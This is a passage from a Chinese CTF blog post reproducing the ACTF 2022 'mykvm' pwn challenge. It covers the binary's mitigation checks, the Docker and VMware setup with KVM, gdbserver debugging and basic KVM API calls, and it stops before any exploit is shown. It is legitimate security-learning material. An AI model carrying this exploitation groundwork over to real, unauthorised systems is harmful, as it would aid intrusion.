<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/11/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/11/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/12/KVM%20pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/12/KVM%20pwn/" class="post-title-link" itemprop="url">KVM pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-12 17:27:37 / Modified: 17:28:25" itemprop="dateCreated datePublished" datetime="2022-07-12T17:27:37+08:00">2022-07-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>mykvm 复现</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">service ctf</span><br><span class="line">&#123;</span><br><span class="line">    disable = no</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    wait        = no</span><br><span class="line">    user        = root</span><br><span class="line">    <span class="built_in">type</span>        = UNLISTED</span><br><span class="line">    port        = <span class="number">8888</span></span><br><span class="line">    bind        = <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">    server      = /home/ctf/mykvm</span><br><span class="line">    banner_fail = /etc/banner_fail</span><br><span class="line">    <span class="comment"># safety options</span></span><br><span class="line">    per_source	= <span class="number">10</span> <span class="comment"># the maximum instances of this service per source IP address</span></span><br><span class="line">    rlimit_cpu	= <span class="number">20</span> <span class="comment"># the maximum number of CPU seconds that the service may use</span></span><br><span class="line">    <span class="comment">#rlimit_as  = 1024M # the Address Space resource limit for the service</span></span><br><span class="line">    <span class="comment">#access_times = 2:00-9:00 12:00-24:00</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mykvm: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">1993</span>c72c363459deb6e3280880959d1f83620724, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，开了 NX，Canary，FORTIFY</li>
</ul>
<p>运行时出现以下报错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./mykvm </span><br><span class="line">./mykvm: error <span class="keyword">while</span> loading shared libraries: libreadline.so<span class="number">.6</span>: cannot open shared object file: No such file <span class="keyword">or</span> directory</span><br></pre></td></tr></table></figure>
<ul>
<li>证明系统已经升级 libreadline.so.6 到 libreadline.so.7 或者 libreadline.so.8</li>
</ul>
<p>使用以下命令就可以解决：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  x86_64-linux-gnu sudo ln -s libreadline.so<span class="number">.8</span><span class="number">.0</span> libreadline.so<span class="number">.6</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我的电脑上是 libreadline.so.8，如果是 libreadline.so.7 修改命令即可</li>
</ul>
<p>拖入 IDA 分析，发现如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/dev/kvm&quot;</span>, <span class="number">524290</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  errx(<span class="number">1</span>, <span class="string">&quot;failed to open /dev/kvm&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>在我的 ubuntu 上没有 <code>/dev/kvm</code></li>
<li>学习 kvm：<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_1054383/1664143">/dev/kvm简单理解</a></li>
</ul>
<p>学习了一下陌生的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">readline</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *prompt)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>prompt：指向提示字符串</li>
<li>readline 的返回值就是该行文本的指针：<ul>
<li>如果是一个空行,那么将返回一个空的字符串</li>
<li>如果在读某一行的过程中遇到了EOF错误，并且是空行的话，便会返回NULL</li>
<li>如果不是空行的话，便会将其当做新的一行</li>
</ul>
</li>
<li>返回值由 malloc() 分配的空间存储，故调用结束后应通过 free() 显式地释放内存 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_history</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">string</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>我们希望输入过的命令行，还可以通过 <code>C-p</code> 或者 <code>C-s</code> 来搜索到，那么就需要将命令行加入到历史列表中，可以调用 <code>add_history()</code> 函数来完成</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offsize)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>start：指向欲对应的内存起始地址，通常设为NULL，代表让系统自动选定地址，对应成功后该地址会返回</li>
<li>length：代表将要把文件映射到内存的字节大小</li>
<li>prot：代表映射区域的保护方式 </li>
<li>flags：会影响映射区域的各种特性</li>
<li>fd：文件描述词，代表欲映射到内存的文件</li>
<li>offset：文件映射的偏移量，通常设置为“0”，代表从文件最前方开始对应，offset 必须是分页大小的整数倍</li>
</ul>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hazir/p/instruction_to_readline.html">GNU Readline 库及编程简介</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7e7a43e98957">mmap函数详解与代码实操</a> </li>
</ul>
<p><strong>KVM (kernel-based virtual machine) 简述</strong></p>
<p><code>/dev/kvm</code> 设备是 kvm(kernel-based virtual machine) 虚拟机的一个设备文件</p>
<p>一，qemu 是一个模拟软件，运行于 linux 的用户空间，qemu 可以模拟我们能见到的所有操作系统，由于是通过模拟的方法来实现系统虚拟化，它产生的所有 CPU 指令都翻译转换一次，因此其性能非常低</p>
<p>二，kvm 是一个运行于内核空间的程序，为了提供一个整体的解决方案（包括用户空间工具集[由qemu提供]，管理各种设备[由kvm内核模块提供]），kvm 开发团队借用了 qemu 代码，并作了一些修改，形成了一套工具，也就是 qemu-kvm（不是linux中的命令） </p>
<p>三，<code>/dev/kvm</code> 是一个字符设备，其核心作用就是让 qemu 与 kvm 内核模块结合起来，当 qemu 打开这个设备后，通过 ioctl 这个系统调用就可以获得 kvm 模块提供的三个抽象对象：</p>
<ul>
<li>kvm：代表 kvm 模块本身，用来管理 kvm 版本信息，创建一个 vm(通过)</li>
<li>vm：代表一个虚拟机，通过 vm 的 io_ctl 接口，可以为虚拟机创建 vcpu，设置内存区间，创建中断控制芯片，分配中断等等</li>
<li>vcpu：代表一个 vcpu，通过 vcpu 的 io_ctl 接口，可以启动或者暂停 vcpu，设置 vcpu 的寄存器，为 vcpu 注入中断等等</li>
</ul>
<p>Qemu 的使用方式:</p>
<ul>
<li>打开 /dev/kvm 设备</li>
<li>通过 KVM_CREATE_VM 创建一个虚拟机对象</li>
<li>通过 KVM_CREATE_VCPU 为虚拟机创建 vcpu 对象</li>
<li>通过 KVM_RUN 设置 vcpu 运行起来</li>
</ul>
<p>因此，<code>/dev/kvm</code> 只是 kvm 内核模块提供给用户空间的一个接口，这个接口被 qemu-kvm 调用，通过 ioctl 系统调用就可以给用户提供一个工具用以创建，删除，管理虚拟机</p>
<p><strong>Docker 搭建环境</strong></p>
<p>题目给了 Dockerfile：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:16.04</span><br><span class="line"></span><br><span class="line">RUN sed -i &quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list &amp;&amp; \</span><br><span class="line">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span><br><span class="line">    apt-get install -y lib32z1 xinetd gdb vim python git</span><br><span class="line"></span><br><span class="line">RUN useradd -m ctf</span><br><span class="line"></span><br><span class="line">WORKDIR /home/ctf</span><br><span class="line"></span><br><span class="line">RUN cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/dev &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/null c 1 3 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/zero c 1 5 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/random c 1 8 &amp;&amp; \</span><br><span class="line">    mknod /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span><br><span class="line">    chmod 666 /home/ctf/dev/*</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/sh /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/ls /home/ctf/bin &amp;&amp; \</span><br><span class="line">    cp /bin/cat /home/ctf/bin</span><br><span class="line"></span><br><span class="line">COPY ./ctf.xinetd /etc/xinetd.d/ctf</span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN echo &quot;Blocked by ctf_xinetd&quot; &gt; /etc/banner_fail</span><br><span class="line"></span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line"></span><br><span class="line">COPY ./bin/ /home/ctf/</span><br><span class="line">RUN chown -R root:ctf /home/ctf &amp;&amp; \</span><br><span class="line">    chmod -R 750 /home/ctf &amp;&amp; \</span><br><span class="line">    chmod 740 /home/ctf/flag</span><br><span class="line"></span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 8888</span><br></pre></td></tr></table></figure>
<p>在目录下执行以下命令：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build .</span><br></pre></td></tr></table></figure>
<p>第一个 images 就是目标了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker images</span><br><span class="line">REPOSITORY        TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">&lt;none&gt;            &lt;none&gt;    <span class="number">94</span>c320b3bb31   <span class="number">2</span> minutes ago   <span class="number">760</span>MB</span><br><span class="line">docker_fpm        latest    <span class="number">842968b</span>ef75b   <span class="number">7</span> days ago      <span class="number">461</span>MB</span><br><span class="line">docker_nginx      latest    <span class="number">51</span>a1d3e9b89d   <span class="number">7</span> days ago      <span class="number">150</span>MB</span><br><span class="line">pwn_ubuntu20<span class="number">.04</span>   <span class="number">20.04</span>     dda29e818595   <span class="number">6</span> months ago    <span class="number">2.25</span>GB</span><br><span class="line"></span><br><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker tag <span class="number">94</span>c320b3bb31 mykvm:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line">ywx813@DESKTOP-I5DPK9O MINGW64 ~/Desktop/<span class="number">2022</span>暑假复现/actf2022_mykvm/docker</span><br><span class="line">$ docker images</span><br><span class="line">REPOSITORY        TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">mykvm             <span class="number">16.04</span>     <span class="number">94</span>c320b3bb31   <span class="number">5</span> minutes ago   <span class="number">760</span>MB</span><br><span class="line">docker_fpm        latest    <span class="number">842968b</span>ef75b   <span class="number">7</span> days ago      <span class="number">461</span>MB</span><br><span class="line">docker_nginx      latest    <span class="number">51</span>a1d3e9b89d   <span class="number">7</span> days ago      <span class="number">150</span>MB</span><br><span class="line">pwn_ubuntu20<span class="number">.04</span>   <span class="number">20.04</span>     dda29e818595   <span class="number">6</span> months ago    <span class="number">2.25</span>GB</span><br></pre></td></tr></table></figure>
<p>尝试在 docker 中运行题目文件：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="string">bin</span>  <span class="string">dev</span>  <span class="string">flag</span>  <span class="string">lib</span>  <span class="string">lib32</span>  <span class="string">mykvm</span></span><br><span class="line"><span class="comment"># ./mykvm</span></span><br><span class="line"><span class="attr">your code size:</span></span><br><span class="line"><span class="number">400</span></span><br><span class="line"><span class="attr">your code:</span></span><br><span class="line"><span class="string">yhellow</span></span><br><span class="line"><span class="attr">guest name:</span> <span class="string">yhellow</span></span><br><span class="line"><span class="attr">guest passwd:</span> <span class="string">yhellow</span></span><br><span class="line"><span class="attr">mykvm:</span> <span class="string">failed</span> <span class="string">to</span> <span class="string">open</span> <span class="string">/dev/kvm</span></span><br></pre></td></tr></table></figure>
<ul>
<li>docker 没有 <code>/dev/kvm</code>，只能想其他办法</li>
<li>PS：启动 docker 时需要添加 -privilage 参数，来允许在 docker 使用 kvm </li>
</ul>
<p><strong>VMware Workstation 16 搭建环境</strong></p>
<p>输入下面的<code>grep</code>命令来看看是否支持硬件虚拟化： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin grep -Eoc <span class="string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果 CPU 支持硬件虚拟化，这个命令将会打印出大于“0”的数字，这代表 CPU 核心数目</li>
<li>否则，如果输出为“0”，它意味着这个 CPU 不支持硬件虚拟化</li>
</ul>
<p>在一些机器上，虚拟化技术可能被厂商在 BIOS 中禁用了，运行下面的命令可以进行查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/kvm-ok <span class="comment">/* kvm-ok需要安装 */</span></span><br></pre></td></tr></table></figure>
<p>也可以通过任务管理器查看：</p>
<img src="/2022/07/12/KVM%20pwn/1657352744964.png" class width="1657352744964"> 
<ul>
<li>已经在BIOS中开启了VT功能</li>
</ul>
<p>关闭虚拟机，在虚拟机设置中勾选 <code>虚拟化引擎</code> 中的前两个：</p>
<img src="/2022/07/12/KVM%20pwn/1657269118245.png" class width="1657269118245">  
<p>得到报错：</p>
<img src="/2022/07/12/KVM%20pwn/1657269160910.png" class width="1657269160910"> 
<p>参考以下博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46499134/article/details/124231658?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-124231658-blog-106523106.pc_relevant_multi_platform_whitelistv1&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-124231658-blog-106523106.pc_relevant_multi_platform_whitelistv1&amp;utm_relevant_index=1">关于“ VMware Workstation 16 此平台不支持虚拟化的Intel VT-x/EPT</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Officialcareer/article/details/120800562">VMware Workstation 16 在此主机上不支持嵌套虚拟化 修复方法</a> </li>
</ul>
<p>最后问题终于解决了（但是 win docker 的环境挂了），要完全关闭 Hyper-V，WSL，同时还要关闭内核隔离（虚拟机访问物理资源时需要通过 VMM 去建立一个虚拟的Ring0权限，内核隔离开启后，默认会启动 Hyper-V）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  bin grep -Eoc <span class="string">&#x27;(vmx|svm)&#x27;</span> /proc/cpuinfo</span><br><span class="line"><span class="number">16</span></span><br></pre></td></tr></table></figure>
<p><strong>调试方法</strong></p>
<p>为了调试环境与题目环境一样，只能使用 docker，但是 win 中的 docker 环境挂了…</p>
<p>最后选择在 ubuntu 中下载了一个 docker，然后利用 Dockerfile 直接在 ubuntu 上搭环境：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mykvm -f Dockerfile .</span><br></pre></td></tr></table></figure>
<p>然后即可启动，一定要后台启动才能跟远程堆环境保持一致，另外还要加 <code>--privileged</code> 参数以便在 docker 内访问 kvm 设备 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  docker docker container run --privileged -p <span class="number">1234</span>:<span class="number">1234</span> -p <span class="number">8000</span>:<span class="number">8888</span> -d mykvm</span><br><span class="line"><span class="number">4b</span>1755d23dc28a56ffafa5ec9cbd5fc0fcb1625a90c0cde88ab3d8ebe8e71f65</span><br><span class="line">➜  docker docker exec -it <span class="number">4b</span>1755d23dc28a5 /bin/bash </span><br><span class="line">root@<span class="number">4b</span>1755d23dc2:/home/ctf# </span><br></pre></td></tr></table></figure>
<p>接下来就可以进入 docker 使用 gdbserver 挂调试器，然后外部连入调试即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="number">9622b</span>ccfc102:/home/ctf<span class="meta"># ip addr show</span></span><br><span class="line"><span class="number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="number">65536</span> qdisc noqueue state UNKNOWN group <span class="keyword">default</span> qlen <span class="number">1000</span></span><br><span class="line">    link/loopback <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> brd <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">    inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8</span> scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">5</span>: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc noqueue state UP group <span class="keyword">default</span> </span><br><span class="line">    link/ether <span class="number">02</span>:<span class="number">42</span>:ac:<span class="number">11</span>:<span class="number">00</span>:<span class="number">02</span> brd ff:ff:ff:ff:ff:ff link-netnsid <span class="number">0</span></span><br><span class="line">    inet <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>/<span class="number">16</span> brd <span class="number">172.17</span><span class="number">.255</span><span class="number">.255</span> scope global eth0</span><br><span class="line">       valid_lft forever preferred_</span><br></pre></td></tr></table></figure>
<ul>
<li>docker IP addr：172.17.0.2</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@<span class="number">9622</span>bccfc<span class="number">102</span>:/home/ctf# gdbserver <span class="number">127.0.0.1:7777</span> ./mykvm</span><br><span class="line"><span class="attribute">Process</span> ./mykvm created; pid = <span class="number">251</span></span><br><span class="line"><span class="attribute">Listening</span> <span class="literal">on</span> port <span class="number">7777</span></span><br><span class="line"><span class="attribute">Remote</span> debugging from host <span class="number">172.17.0.1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>gdbserver port：7777</li>
</ul>
<p>然后再外部使用以下命令进行连接：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">7777</span></span><br></pre></td></tr></table></figure>
<p><strong>KVM api 使用案例</strong></p>
<p>首先，我们需要打开 <code>/dev/kvm</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kvm = open(<span class="string">&quot;/dev/kvm&quot;</span>, O_RDWR | O_CLOEXEC);</span><br></pre></td></tr></table></figure>
<p>接下来，我们需要创建一个虚拟机（VM），它表示与一个模拟系统关联的所有内容，包括内存和一个或多个 CPU，KVM 以文件描述符的形式为我们提供此 VM 的句柄：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmfd = ioctl(kvm, KVM_CREATE_VM, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>); </span><br><span class="line"><span class="comment">/* KVM_CREATE_VM:0xae01 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>KVM 系统提供文件描述符来控制虚拟机 </li>
</ul>
<p>虚拟机需要我们提供内存，对应虚拟机中的物理地址空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mem = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一页内存来保存测试代码，直接使用 mmap 获得页对齐的、初始值为 0 的内存</li>
</ul>
<p>将机器码复制到这块内存：</p>
